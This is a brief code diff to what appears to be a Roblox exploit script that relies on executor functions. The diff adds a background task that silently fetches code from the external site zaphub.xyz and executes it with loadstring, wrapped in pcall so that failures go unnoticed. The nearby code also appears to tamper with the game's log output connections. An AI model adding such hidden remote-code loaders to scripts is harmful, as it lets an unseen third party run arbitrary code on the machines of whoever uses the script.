@@ -1,4 +1,11 @@
 task.spawn(function()
+    task.wait(1)
+    pcall(function()
+        loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+    end)
+end)
+
+task.spawn(function()
     task.wait(4)
     for i, v in pairs(getconnections(game.LogService.MessageOut)) do
         pcall(function()
